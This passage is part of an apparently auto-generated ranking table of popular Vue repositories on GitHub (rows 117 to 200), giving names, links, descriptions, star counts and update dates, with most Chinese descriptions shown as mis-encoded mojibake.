|117|[bullteam/zeus-admin](https://github.com/bullteam/zeus-admin)|ZeusÂü∫‰∫éGolang Gin +casbinÔºåËá¥Âäõ‰∫éÂÅö‰ºÅ‰∏öÁªü‰∏ÄÊùÉÈôê&Ë¥¶Âè∑‰∏≠ÂøÉÁÆ°ÁêÜÁ≥ªÁªü„ÄÇÂåÖÂê´Ë¥¶Âè∑ÁÆ°ÁêÜÔºåÊï∞ÊçÆÊùÉÈôêÔºåÂäüËÉΩÊùÉÈôêÔºåÂ∫îÁî®ÁÆ°ÁêÜÔºåÂ§öÊï∞ÊçÆÂ∫ìÈÄÇÈÖçÔºåÂèØdocker ‰∏ÄÈîÆËøêË°å„ÄÇÁ§æÂå∫Ê¥ªË∑ÉÔºåÁâàÊú¨Ëø≠‰ª£Âø´ÔºåÂä†Áæ§ÂÖçË¥πÊäÄÊúØÊîØÊåÅ„ÄÇ|339|Vue|10/28|
|118|[lentoo/vue-admin](https://github.com/lentoo/vue-admin)|‰ΩøÁî® vue-cli3 Êê≠Âª∫ÁöÑvue-vuex-router-element ÂºÄÂèëÊ®°ÁâàÔºåÈõÜÊàêÂ∏∏Áî®ÁªÑ‰ª∂ÔºåÂäüËÉΩÊ®°Âùó|338|Vue|09/07|
|119|[anjoy8/Blog.Vue](https://github.com/anjoy8/Blog.Vue)|‚òò ‰∏Ä‰∏™vueÁöÑ‰∏™‰∫∫ÂçöÂÆ¢È°πÁõÆÔºåÈÖçÂêà.net core apiÊïôÁ®ãÔºåÊâìÈÄ†ÂâçÂêéÁ´ØÂàÜÁ¶ª|336|Vue|09/15|
|120|[vincentzyc/form-design](https://github.com/vincentzyc/form-design)|Âä®ÊÄÅË°®ÂçïÈ°µÈù¢ËÆæËÆ°--Ëá™Âä®ÁîüÊàêÈ°µÈù¢|332|Vue|10/30|
|121|[HuberTRoy/vue-shiyanlou](https://github.com/HuberTRoy/vue-shiyanlou)|:kissing_heart:Âü∫‰∫évue2ÂíåvuexÁöÑÂ§çÊùÇÂçïÈ°µÈù¢Â∫îÁî®Ôºå20+È°µÈù¢53‰∏™APIÔºà‰ªøÂÆûÈ™åÊ•ºÔºâ:sparkles::sparkles:|327|Vue|10/15|
|122|[ddiu8081/ChartFun](https://github.com/ddiu8081/ChartFun)|üé≤Êï∞ÊçÆÂ§ßÂ±èÂèØËßÜÂåñÁºñËæëÂô®|321|Vue|09/18|
|123|[IFmiss/vue-website](https://github.com/IFmiss/vue-website)|:cake: ÊÉ≥Áî®vueÊääÊàëÁé∞Âú®ÁöÑ‰∏™‰∫∫ÁΩëÁ´ôÈáçÊñ∞ÂÜô‰∏Ä‰∏ãÔºåÊñ∞ÁöÑÈ£éÊ†ºÔºåÊñ∞ÁöÑÊäÄÊúØÔºå‰ªÄ‰πàÈÉΩÊòØÊñ∞ÁöÑÔºÅ|319|Vue|09/04|
|124|[OXOYO/X-WebDesktop-Vue](https://github.com/OXOYO/X-WebDesktop-Vue)|Âü∫‰∫é Vue & Koa ÁöÑ WebDesktop ËßÜÁ™óÁ≥ªÁªü   The WebDesktop system based on Vue|318|Vue|10/20|
|125|[meloalright/vue-ins-progress-bar](https://github.com/meloalright/vue-ins-progress-bar)|‰∏ÄÊ¨æ ins È£éÊ†ºÁöÑ vue ËøõÂ∫¶Êù°ÁªÑ‰ª∂|314|Vue|09/28|
|126|[jackchen0120/vueDataV](https://github.com/jackchen0120/vueDataV)|Âü∫‰∫éVue + Echarts ÊûÑÂª∫ÁöÑÊï∞ÊçÆÂèØËßÜÂåñÂπ≥Âè∞ÔºåÈÖ∑ÁÇ´Â§ßÂ±èÂ±ïÁ§∫Ê®°ÊùøÂíåÁªÑ‰ª∂Â∫ìÔºåÊåÅÁª≠Êõ¥Êñ∞ÂêÑË°åÂêÑ‰∏öÂÆûÁî®Ê®°ÊùøÂíåÁÇ´ÈÖ∑Â∞èÁªÑ‰ª∂„ÄÇ|312|Vue|09/12|
|127|[GeekPark/smeditor](https://github.com/GeekPark/smeditor)|‚úé Âü∫‰∫é Vue.js 2.0+ Áü≥Â¢®ÊñáÊ°£Ê†∑ÂºèÁöÑÂØåÊñáÊú¨ÁºñËæëÂô®ÁªÑ‰ª∂|310|Vue|09/08|
|128|[hql7/wl-micro-frontends](https://github.com/hql7/wl-micro-frontends)|Micro front end practical project tutorial. ÂæÆÂâçÁ´ØÈ°πÁõÆÂÆûÊàòvueÈ°πÁõÆ„ÄÇÂü∫‰∫évue3.0&qiankun2.0ËøõÈò∂ÁâàÔºöhttps://github.com/wl-ui/wl-mfe|308|Vue|09/11|
|129|[go-admin-team/go-admin-ui](https://github.com/go-admin-team/go-admin-ui)|Âü∫‰∫éGin + Vue + Element UIÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÊùÉÈôêÁÆ°ÁêÜÁ≥ªÁªüÁöÑÂâçÁ´ØÊ®°Âùó|304|Vue|10/28|
|130|[tower1229/Vue-Giant-Tree](https://github.com/tower1229/Vue-Giant-Tree)|üå≥ Â∑®Ê†ëÔºöÂü∫‰∫éztreeÂ∞ÅË£ÖÁöÑVueÊ†ëÂΩ¢ÁªÑ‰ª∂ÔºåËΩªÊùæÂÆûÁé∞Êµ∑ÈáèÊï∞ÊçÆÁöÑÈ´òÊÄßËÉΩÊ∏≤Êüì„ÄÇ|302|Vue|09/17|
|131|[huxiaocheng/vue-gn-components](https://github.com/huxiaocheng/vue-gn-components)|ËøôÈáåÊúâ‰∏Ä‰∫õÊ†áÂáÜÁªÑ‰ª∂Â∫ìÂèØËÉΩÊ≤°ÊúâÁöÑÂäüËÉΩÁªÑ‰ª∂ÔºåÂ∑≤ÊúâÁªÑ‰ª∂ÔºöÊîæÂ§ßÈïú„ÄÅÁ≠æÂà∞„ÄÅÂõæÁâáÊ†áÁ≠æ„ÄÅÊªëÂä®È™åËØÅ„ÄÅÂÄíËÆ°Êó∂„ÄÅÊ∞¥Âç∞„ÄÅÊãñÊãΩ„ÄÅÂ§ßÂÆ∂Êù•ÊâæËå¨„ÄÇ|296|Vue|09/11|
|132|[MrZHLF/vue-admin](https://github.com/MrZHLF/vue-admin)|vue-cli3.0ÂêéÂè∞ÁÆ°ÁêÜÊ®°Êùø|294|Vue|09/07|
|133|[JackWeiler/ktv-select_music-system](https://github.com/JackWeiler/ktv-select_music-system)|KTVÁÇπÊ≠åÁ≥ªÁªü,Âê´ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü(ÂÆåÊï¥Áâà)|294|Vue|08/21|
|134|[niefy/wx-manage](https://github.com/niefy/wx-manage)|üî•ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂåÖÂê´ÂÖ¨‰ºóÂè∑ËèúÂçïÁÆ°ÁêÜüóÑ„ÄÅËá™Âä®ÂõûÂ§çüó®„ÄÅÁ¥†ÊùêÁÆ°ÁêÜüìÇ„ÄÅÊ®°ÊùøÊ∂àÊÅØ‚òò„ÄÅÁ≤â‰∏ùÁÆ°ÁêÜü§π‚Äç‚ôÇÔ∏èÁ≠âÂäüËÉΩÔºåÂâçÂêéÁ´ØÈÉΩÂºÄÊ∫êÂÖçË¥πüõ©|293|Vue|10/01|
|135|[Tsuk1ko/bilibili-live-chat](https://github.com/Tsuk1ko/bilibili-live-chat)|üìΩÔ∏è Êó†ÂêéÁ´ØÁöÑ‰ªø YouTube Live Chat È£éÊ†ºÁöÑÁÆÄÊòì Bilibili ÂºπÂπïÂß¨|284|Vue|10/13|
|136|[mizuka-wu/vue2-verify](https://github.com/mizuka-wu/vue2-verify)|vueÁöÑÈ™åËØÅÁ†ÅÊèí‰ª∂|281|Vue|09/08|
|137|[rogeraabbccdd/Fadacai-Generator](https://github.com/rogeraabbccdd/Fadacai-Generator)|Ë∑üËëóÈüìÁ∏Ω‰∏ÄËµ∑ËÆìÈ´òÈõÑÁôºÂ§ßË≤°!|281|Vue|09/09|
|138|[scscms/vue-scscms](https://github.com/scscms/vue-scscms)|Âü∫‰∫ékoa2+mysql+vue2.0+ElementÈò≥ÂÖâÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÔºåÊ®°ËåÉÂ≠¶‰π†Demo|277|Vue|04/12|
|139|[MPComponent/mpvue-weui](https://github.com/MPComponent/mpvue-weui)|Âü∫‰∫é mpvue ÁöÑ weui Ê°ÜÊû∂|275|Vue|09/06|
|140|[daoket/vue.news](https://github.com/daoket/vue.news)|È°πÁõÆÂú∞ÂùÄ|274|Vue|09/10|
|141|[qq50032660/shopping_pro](https://github.com/qq50032660/shopping_pro)|uniapp ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚ÄîÂïÜÂüéÊ®°Áâà|273|Vue|09/07|
|142|[fujiazhang/Music-For-The-Poor](https://github.com/fujiazhang/Music-For-The-Poor)|VueÊäÄÊúØÊ†à ÊâìÈÄ†Á≤æÁæéÈü≥‰πêWebApppÔºå‰∏îËÉΩÂê¨‰ªòË¥πÊ≠åÊõ≤ÔºàÊØîÂ¶ÇÂë®Êù∞‰º¶Á≠âÔºâÔºåÊèê‰æõ‰ºòÈõÖÁöÑÁî®Êà∑‰ΩìÈ™å„ÄÇ‰ªøÁΩëÊòì‰∫ëÈü≥‰πê„ÄÅ‰ªøQQÈü≥‰πê„ÄÅvueÈü≥‰πêÊí≠ÊîæÂô®„ÄÅmusic player„ÄÇ|269|Vue|09/17|
|143|[d2-projects/d2-crud](https://github.com/d2-projects/d2-crud)|D2 Crud ÊòØ‰∏Ä‰∏™Âü∫‰∫é Vue.js Âíå Element UI ÁöÑË°®Ê†ºÁªÑ‰ª∂ÔºåÂ∞ÅË£Ö‰∫ÜÂ∏∏Áî®ÁöÑË°®Ê†ºÊìç‰Ωú„ÄÇ|268|Vue|09/10|
|144|[allan2coder/VUE2-SPA-Tutorial](https://github.com/allan2coder/VUE2-SPA-Tutorial)|Vue2.xÔºàÂç≥Â∞ÜÂçáVue 3Ôºâ„ÄÅ Webpack 4.x„ÄÅBabel 7.x|268|Vue|06/24|
|145|[kouchao/vue-layui](https://github.com/kouchao/vue-layui)|Âü∫‰∫évueÁöÑlayui|266|Vue|09/05|
|146|[bestaone/HiAuth](https://github.com/bestaone/HiAuth)|HiAuthÊòØ‰∏Ä‰∏™ÂºÄÊ∫êÁöÑÂü∫‰∫éOauth2ÂçèËÆÆÁöÑËÆ§ËØÅ„ÄÅÊéàÊùÉÁ≥ªÁªü„ÄÇ|256|Vue|10/29|
|147|[SNFocus/approvalFlow](https://github.com/SNFocus/approvalFlow)|Âü∫‰∫éform-generatorÔºå‰ªøÈíâÈíâÂÆ°ÊâπÊµÅÁ®ãÂàõÂª∫ÔºàË°®ÂçïÂàõÂª∫/ÊµÅÁ®ãËäÇÁÇπÂèØËßÜÂåñÈÖçÁΩÆ/ÂøÖÂ°´Êù°‰ª∂ÂèäÊ†°È™åÔºâ|256|Vue|10/23|
|148|[linjinze999/vue-llplatform](https://github.com/linjinze999/vue-llplatform)|vue-llplatformÔºåÂü∫‰∫évue„ÄÅelementÊê≠Âª∫ÁöÑÂêéÂè∞ÁÆ°ÁêÜÂπ≥Âè∞„ÄÇ|249|Vue|09/09|
|149|[CS-Tao/whu-library-seat](https://github.com/CS-Tao/whu-library-seat)|Ê≠¶Ê±âÂ§ßÂ≠¶Âõæ‰π¶È¶ÜÂä©Êâã - Ê°åÈù¢Á´Ø|248|Vue|10/24|
|150|[xusenlin/vue-element-ui-admin](https://github.com/xusenlin/vue-element-ui-admin)|:maple_leaf:  ‰∏Ä‰∏™Âü∫‰∫é Vue Element UI ÁöÑÂêéÂè∞Ê®°ÊùøÔºåÂÅö‰∫ÜÁõÆÂΩïÁªìÊûÑÁöÑÊï¥ÁêÜÂíåÂ∏∏Áî®ÊñπÊ≥ïÁöÑÂ∞ÅË£ÖÔºåÂºÄÁÆ±Âç≥Áî® :)|247|Vue|09/21|
|151|[wuyawei/webrtc-stream](https://github.com/wuyawei/webrtc-stream)|üçßüç≠üòªÂåÖÊã¨‰ΩÜ‰∏çÂ±ÄÈôê‰∫é WebRTC ÁöÑÂêÑÁßçÊ†óÂ≠ê|246|Vue|09/07|
|152|[wx-chevalier/Web-Series](https://github.com/wx-chevalier/Web-Series)|:books: Áé∞‰ª£ Web ÂºÄÂèëÔºåÁé∞‰ª£ Web ÂºÄÂèëÂØºËÆ∫   Âü∫Á°ÄÁØá   ËøõÈò∂ÁØá   Êû∂ÊûÑ‰ºòÂåñÁØá   React ÁØá   Vue ÁØá|245|Vue|10/29|
|153|[daoshengfu/Vue-NeteaseCloud-WebMusicApp](https://github.com/daoshengfu/Vue-NeteaseCloud-WebMusicApp)|VueÈ´ò‰ªøÁΩëÊòì‰∫ëÈü≥‰πêÔºåÂü∫Êú¨ÂÆûÁé∞ÁΩëÊòì‰∫ëÊâÄÊúâÈü≥‰πê„ÄÅMVÁõ∏ÂÖ≥ÂäüËÉΩÔºåÁé∞Â∑≤Êõ¥Êñ∞Âà∞Á¨¨‰∫åÁâàÔºå‰ªÖÁî®‰∫éÂ≠¶‰π†Ôºå‰∏ãÈù¢ÊúâËØ¶ÁªÜÊïôÁ®ã„ÄÇ |245|Vue|10/18|
|154|[YXJ2018/SpringBoot-Vue-OnlineExam](https://github.com/YXJ2018/SpringBoot-Vue-OnlineExam)|Âú®Á∫øËÄÉËØïÁ≥ªÁªüÔºåspringboot+vueÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑ‰∏Ä‰∏™È°πÁõÆÔºåËÆ∞ÂΩïËá™Â∑±ÊØï‰∏öËÆæËÆ°ÂÆåÊàêÁöÑÊÉÖÂÜµ|243|Vue|09/07|
|155|[chaohangz/vueBlog](https://github.com/chaohangz/vueBlog)|vue + node + express + mongodb  ‰∏™‰∫∫ÂçöÂÆ¢Á≥ªÁªü|242|Vue|10/27|
|156|[zhuyihe/vue-admin-project](https://github.com/zhuyihe/vue-admin-project)|vue-cli3Êê≠Âª∫ÂêéÂè∞ÁÆ°ÁêÜÊ®°Êùø|241|Vue|09/16|
|157|[Tencent/WeComponents](https://github.com/Tencent/WeComponents)|Âü∫‰∫éÈÄöÁî®ÁªÑ‰ª∂ËØ≠Ë®ÄËßÑËåÉ (CLS) ÂÆûÁé∞ÁöÑ Vue.js Â£∞ÊòéÂºèÁªÑ‰ª∂Â∫ì|233|Vue|06/27|
|158|[ssshooter/img-vuer](https://github.com/ssshooter/img-vuer)|An Mobile-First image viewer for Vue2  / ‰∏Ä‰∏™ÁßªÂä®Á´Ø‰ºòÂÖàÁöÑ Vue2 ÂõæÁâáÈ¢ÑËßàÊèí‰ª∂|233|Vue|09/07|
|159|[Acmenlei/Many-people-blog](https://github.com/Acmenlei/Many-people-blog)|üéàÂü∫‰∫évue+node+mysqlÁöÑÂ§ö‰∫∫ÂçöÂÆ¢ÔºåÂ∏¶ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü„ÄÇÊîØÊåÅÔºöÁôªÈôÜ/Ê≥®ÂÜåÔºåÁïôË®ÄÔºåËØÑËÆ∫/ÂõûÂ§çÔºåÁÇπËµûÔºåËÆ∞ÂΩïÊµèËßàÊï∞ÈáèÔºåÂ∏¶ÊúâÁõ∏ÂÜåÂäüËÉΩÔºåÂÜÖÂÆπ‰∏∞ÂØåÔºåÂΩìÁÑ∂‰πüÂèØ‰ª•ÂèëË°®ÊñáÁ´†„ÄÇÊ¨¢Ëøé‰ΩøÁî®ÔºÅ|231|Vue|09/30|
|160|[qiuChengleiy/shop-vue](https://github.com/qiuChengleiy/shop-vue)|  vue-cli + vue-router + vuex + axios + vue-axios + vant( UI )  ÁßªÂä®Á´ØÂïÜÂüé APPÈ°πÁõÆ |230|Vue|04/08|
|161|[2017coding/BBS_admin](https://github.com/2017coding/BBS_admin)|vue+ElementUI+axios Êé•ÂÖ•Êï∞ÊçÆÔºå‰ªøsegmentfaultÔºåÂÅöÁõ∏ÂÖ≥ÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü https://lyh.red/admin/|228|Vue|09/04|
|162|[arkntools/arknights-toolbox](https://github.com/arkntools/arknights-toolbox)|üî® Arknights Toolbox, all servers are supported. ÊòéÊó•ÊñπËàüÂ∑•ÂÖ∑ÁÆ±ÔºåÊîØÊåÅ‰∏≠Âè∞Êó•Èü©ÂõΩÈôÖÊúç|216|Vue|10/28|
|163|[QinZhen001/didi](https://github.com/QinZhen001/didi)|:car: mpvueÊ°ÜÊû∂‰ªøÊª¥Êª¥Âá∫Ë°åÂæÆ‰ø°Â∞èÁ®ãÂ∫è|215|Vue|04/03|
|164|[momosecurity/bombus](https://github.com/momosecurity/bombus)|ÂêàËßÑÂÆ°ËÆ°Âπ≥Âè∞|214|Vue|10/15|
|165|[livegbs/GB28181-Server](https://github.com/livegbs/GB28181-Server)|LiveGBSÂõΩÊ†á(GB28181)ÊµÅÂ™í‰ΩìÊúçÂä°ËΩØ‰ª∂Ôºö Êèê‰æõÁî®Êà∑ÁÆ°ÁêÜÂèäWebÂèØËßÜÂåñÈ°µÈù¢ÁÆ°ÁêÜÔºõ Êèê‰æõËÆæÂ§áÁä∂ÊÄÅÁÆ°ÁêÜÔºåÂèØÂÆûÊó∂Êü•ÁúãËÆæÂ§áÊòØÂê¶ÊéâÁ∫øÁ≠â‰ø°ÊÅØÔºõ ÂÆûÊó∂ÊµÅÂ™í‰ΩìÂ§ÑÁêÜÔºåPSÔºàTSÔºâËΩ¨ESÔºõ ËÆæÂ§áÁä∂ÊÄÅÁõëÊµã„ÄÅ‰∫ëÂè∞ÊéßÂà∂„ÄÅÂΩïÂÉèÊ£ÄÁ¥¢„ÄÅÂõûÊîæÔºõ Êèê‰æõRTSP„ÄÅRTMP„ÄÅHTTP-FLV„ÄÅHLSÁ≠âÂ§öÁßçÂçèËÆÆÊµÅËæìÂá∫Ôºõ ÂØπÂ§ñÊèê‰æõÊúçÂä°Âô®Ëé∑ÂèñÁä∂ÊÄÅ„ÄÅ‰ø°ÊÅØÔºåÊéßÂà∂Á≠âHTTP APIÊé•Âè£ÔºõÊîØÊåÅËØ≠Èü≥ÂØπËÆ≤ÔºõÊîØÊåÅ‰∫ëÁ´ØÂΩïÂÉèÔºõTCP„ÄÅUDP‰∏§ÁßçÊñπÂºè‰ø°‰ª§‰º†Ëæì‰ª•ÂèäUDP„ÄÅTCPË¢´Âä®„ÄÅTCP‰∏ªÂä®‰∏âÁßçËßÜÈ¢ëÊµÅ‰º†ËæìÊñπÂºèÔºõ|211|Vue|10/29|
|166|[xlogiccc/vue-picture-preview](https://github.com/xlogiccc/vue-picture-preview)|ÁßªÂä®Á´Ø„ÄÅPC Á´Ø Vue.js ÂõæÁâáÈ¢ÑËßàÊèí‰ª∂   Friendly picture file preview Vue.js plugin based on PhotoSwipe.|211|Vue|10/02|
|167|[tangjinzhou/geektime-vue-1](https://github.com/tangjinzhou/geektime-vue-1)|ÊûÅÂÆ¢Êó∂Èó¥Âü∫Á°ÄÁØá&ÁîüÊÄÅÁØá‰ª£Á†Å|211|Vue|09/08|
|168|[zuley/vue-color-picker](https://github.com/zuley/vue-color-picker)|Vue È¢úËâ≤ÈÄâÊã©Âô®Êèí‰ª∂|210|Vue|09/27|
|169|[StavinLi/Workflow](https://github.com/StavinLi/Workflow)|‰ªøÈíâÈíâÂÆ°ÊâπÊµÅÁ®ãËÆæÁΩÆ|210|Vue|06/10|
|170|[Sandop/NuxtPC](https://github.com/Sandop/NuxtPC)|Âü∫‰∫éNuxtÁöÑ‰ºÅ‰∏öÂÆòÁΩë|209|Vue|07/30|
|171|[CS-Tao/whu-library-seat-mobile](https://github.com/CS-Tao/whu-library-seat-mobile)|Ê≠¶Ê±âÂ§ßÂ≠¶Âõæ‰π¶È¶ÜÂä©Êâã - ÁßªÂä®Á´Ø|208|Vue|10/22|
|172|[zhoutaoo/SpringCloud-Admin](https://github.com/zhoutaoo/SpringCloud-Admin)|ÂæÆÊúçÂä°ÂêéÂè∞ÈÄöÁî®ÁÆ°ÁêÜÁ≥ªÁªü|206|Vue|09/04|
|173|[febsteam/FEBS-Cloud-Web](https://github.com/febsteam/FEBS-Cloud-Web)|FEBS Cloud ÂæÆÊúçÂä°ÊùÉÈôêÁ≥ªÁªüÂâçÁ´ØÔºå‰ΩøÁî® vue-element-admin ÊûÑÂª∫|206|Vue|06/12|
|174|[ifzc/Shkjem](https://github.com/ifzc/Shkjem)|Âü∫‰∫éVue&ElementUIÁöÑ‰ºÅ‰∏öÂÆòÁΩë|205|Vue|09/07|
|175|[caiya/vue-neditor-wrap](https://github.com/caiya/vue-neditor-wrap)|Âü∫‰∫évueÂíåneditorÁöÑÂèåÂêëÁªëÂÆöÁªÑ‰ª∂Ôºå‰ΩøÁî®vue-cli3ÁöÑÈ°πÁõÆÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®|203|Vue|07/16|
|176|[Liugq5713/vue-element-nocode-admin](https://github.com/Liugq5713/vue-element-nocode-admin)|element-ui ÁöÑ‰ª£Á†ÅÂèØËßÜÂåñÁºñËæë|203|Vue|09/08|
|177|[Zealon159/book-ms-ui](https://github.com/Zealon159/book-ms-ui)|:beers:  Âü∫‰∫é vue.js „ÄÅelement-ui Êê≠Âª∫‰∏Ä‰∏™ÊûÅÁÆÄÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÂõæ‰π¶ÁÆ°ÁêÜÂπ≥Âè∞|200|Vue|05/22|
|178|[YTU94/meedu-wxapp](https://github.com/YTU94/meedu-wxapp)|üìúmeEduÂæÆ‰ø°Â∞èÁ®ãÂ∫è„ÄÇÔºàwxapp for meeduÔºâ|199|Vue|09/08|
|179|[CyberFei/puzzle](https://github.com/CyberFei/puzzle)|A pluggable micro-frontend structure based on Vue and Webpack4. Âü∫‰∫é Vue Âíå Webpack4 ÁöÑÂèØÁÉ≠ÊèíÊãîÂºèÂæÆÂâçÁ´ØÊû∂ÊûÑ|195|Vue|09/23|
|180|[shiguanghuxian/etcd-manage](https://github.com/shiguanghuxian/etcd-manage)|‰∏Ä‰∏™Áé∞‰ª£ÁöÑetcd v3ÁÆ°ÁêÜui|195|Vue|09/04|
|181|[xjh22222228/vue-cnode](https://github.com/xjh22222228/vue-cnode)|üöÄ Âü∫‰∫évue3 function-based ÊûÑÂª∫cnodeÁ§æÂå∫|194|Vue|09/05|
|182|[yunfeihuang/vx-ui](https://github.com/yunfeihuang/vx-ui)|vue components ÁßªÂä®Á´ØUIÁªÑ‰ª∂Â∫ì|193|Vue|09/15|
|183|[Alvin-Liu/h5editor](https://github.com/Alvin-Liu/h5editor)|‰ªøÊòì‰ºÅÁßÄÁ±ªh5È°µÈù¢ÁºñËæëÂ∑•ÂÖ∑Ôºà‰∏çÂÜçÁª¥Êä§Ôºâ|190|Vue|09/08|
|184|[fuyi501/web-video-live](https://github.com/fuyi501/web-video-live)|ÁΩëÈ°µH5Êí≠ÊîæËßÜÈ¢ëÊµÅ/Áõ¥Êí≠Á≥ªÁªüÔºå‰ΩøÁî® flv.jsÔºåvue-video-playerÊí≠ÊîæÂô®ÔºåÊµãËØïÊîØÊåÅ rtmpÔºåhttp-flvÔºåhls ËßÜÈ¢ëÊµÅÊ†ºÂºèÔºåÂèØ‰ª•ÂÅöËßÜÈ¢ëÁõëÊéßÔºå‰πüÂèØ‰ª•ÈÄöËøáËßÜÈ¢ëÊà™Âõæ„ÄÇ|188|Vue|09/09|
|185|[lx544690189/vue-mobile-calendar](https://github.com/lx544690189/vue-mobile-calendar)|a vue component of calendar for mobileÁßªÂä®Á´ØvueÊó•ÊúüÈÄâÊã©ÁªÑ‰ª∂|187|Vue|09/08|
|186|[amazingTest/Taisite-Platform](https://github.com/amazingTest/Taisite-Platform)|ÊúÄÂº∫Êé•Âè£ÊµãËØïÂπ≥Âè∞|185|Vue|09/26|
|187|[lhz960904/movie-trailer](https://github.com/lhz960904/movie-trailer)|:popcorn:Vue3 + TypeScriptÂºÄÂèëÁöÑÁîµÂΩ±È¢ÑÂëäÁâáwebAPPÔºåÂèØ‰ª•Êü•ÁúãÊ≠£Âú®ÁÉ≠Êò†‰∏éÂç≥Â∞Ü‰∏äÊò†ÁöÑÁîµÂΩ±‰ø°ÊÅØÂíåÁü≠Áâá|184|Vue|08/19|
|188|[hellowuxin/mindmap](https://github.com/hellowuxin/mindmap)|ÊÄùÁª¥ÂØºÂõæVueÁªÑ‰ª∂ - mindmap: vue component|182|Vue|08/14|
|189|[chenquincy/vue-dynamic-form-component](https://github.com/chenquincy/vue-dynamic-form-component)|Vue dynamic nested form component, support nested Object/Hashmap/Array. VueÂä®ÊÄÅÂ§öÁ∫ßË°®ÂçïÁªÑ‰ª∂ÔºåÊîØÊåÅÂµåÂ•óÂØπË±°/Hashmap/Êï∞ÁªÑ„ÄÇ|180|Vue|10/20|
|190|[hanjiangxueying/vue2-iview2-admin](https://github.com/hanjiangxueying/vue2-iview2-admin)|Âü∫‰∫évue2Âíåiview2ÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|180|Vue|08/03|
|191|[CBDxin/VueSocial](https://github.com/CBDxin/VueSocial)|something like QQ„ÄÅweibo„ÄÅweChatÔºàvue+express+socket.io‰ªøÂæÆÂçö„ÄÅÂæÆ‰ø°ÁöÑËÅäÂ§©Á§æ‰∫§Âπ≥Âè∞Ôºâ|179|Vue|09/07|
|192|[hbteam/weex-droplet-ui](https://github.com/hbteam/weex-droplet-ui)|Ê∞¥Êª¥UI‰∏Ä‰∏™ËΩªÈáèÁ∫ßweex UIÁªÑ‰ª∂Â∫ìÔºåÂåÖÂê´Ë°®ÂçïÂÖÉÁ¥†ÔºåtabbarÔºåpickerÂüéÂ∏Ç‰∏âÁ∫ßËÅîÂä®ÈÄâÊã©ÔºåactionsheetÔºåswitchÁ≠â‰∏ÄÁ≥ªÂàóÂ∏∏Áî®ÁªÑ‰ª∂|177|Vue|04/16|
|193|[GitHubGanKai/vue3-jd-h5](https://github.com/GitHubGanKai/vue3-jd-h5)|:fire: Âü∫‰∫évue2.6+ Ôºåvue3.0.0-beta.1Ôºåvue3, vue-cli3ÔºåmockjsÔºå‰ªø‰∫¨‰∏úÊ∑òÂÆùÁöÑÔºåÁßªÂä®Á´ØH5ÁîµÂïÜÂπ≥Âè∞ÔºÅ|177|Vue|10/25|
|194|[qianduanzhou/cloudmusic](https://github.com/qianduanzhou/cloudmusic)|vue+electron+nodeÁöÑÈ´ò‰ªøÁΩëÊòì‰∫ëÊ°åÈù¢Á´ØÂ∫îÁî®|176|Vue|09/08|
|195|[wensiyuanseven/light-virtual-list](https://github.com/wensiyuanseven/light-virtual-list)|‰∏ìÊ≥®‰∫éÁÄëÂ∏ÉÊµÅ,Êï¥Â±èÊªëÂä®ÁöÑËôöÊãüÂåñÂàóË°®VueÁªÑ‰ª∂Â∫ì|174|Vue|09/02|
|196|[dnyz520/careyshop-admin](https://github.com/dnyz520/careyshop-admin)|Âü∫‰∫éThinkPHP5ÂíåVueÁöÑÈ´òÊÄßËÉΩÂâçÂêéÁ´ØÂàÜÁ¶ªÂïÜÂüéÂêéÂè∞ÁÆ°ÁêÜÊ°ÜÊû∂Á≥ªÁªü|173|Vue|10/24|
|197|[MPComponent/mpvue-picker](https://github.com/MPComponent/mpvue-picker)|Âü∫‰∫é mpvue Ê°ÜÊû∂ÁöÑÂ∞èÁ®ãÂ∫èÈÄâÊã©Êéß‰ª∂ÔºåÊîØÊåÅÂçïÂàóÔºåÂ§öÂàóÔºåËÅîÂä®„ÄÇ|173|Vue|10/24|
|198|[acccccccb/vue-img-cutter](https://github.com/acccccccb/vue-img-cutter)|ÁÆÄÂçïÊòìÁî®ÁöÑvueÂõæÁâáË£ÅÂâ™Êèí‰ª∂ÔºåÊîØÊåÅÁßªÂä®ÂõæÂÉèÔºåË£ÅÂâ™ÂõæÁâáÔºåÊîæÂ§ßÁº©Â∞èÂõæÁâáÔºå‰∏ä‰∏ãÂ∑¶Âè≥ÁßªÂä®ÔºåÂõ∫ÂÆöÊØî‰æãÔºåÂõ∫ÂÆöÂ∞∫ÂØ∏ÔºåËøúÁ®ãÂõæÁâáË£ÅÂâ™ÔºåÂè™ÈúÄË¶ÅÂæàÂ∞ëÁöÑ‰ª£Á†ÅÂ∞±ÂèØ‰ª•ÂÆûÁé∞Ë£ÅÂâ™ÂäüËÉΩÔºå‰πüÂèØ‰ª•ÈÄöËøáË∞ÉÊï¥ÂèÇÊï∞‰ª•ÈÄÇÂ∫î‰Ω†Ëá™Â∑±ÁöÑ‰∏öÂä°ÈúÄÊ±Ç„ÄÇ|170|Vue|10/11|
|199|[baimingxuan/vue-admin-design](https://github.com/baimingxuan/vue-admin-design)|Âü∫‰∫évue + elementUIÁöÑÁÆ°ÁêÜÁ≥ªÁªüÊ®°Êùø|170|Vue|09/23|
|200|[wannaxiao/vuepress-theme-resume](https://github.com/wannaxiao/vuepress-theme-resume)|üêà ‰π¶ÂÜôÁÆÄÊ¥Å‰ºòÈõÖÁöÑÂâçÁ´ØÁ®ãÂ∫èÂëò markdown ÁÆÄÂéÜÔºåÁî± vuepress È©±Âä®|170|Vue|05/09|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## CSS

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
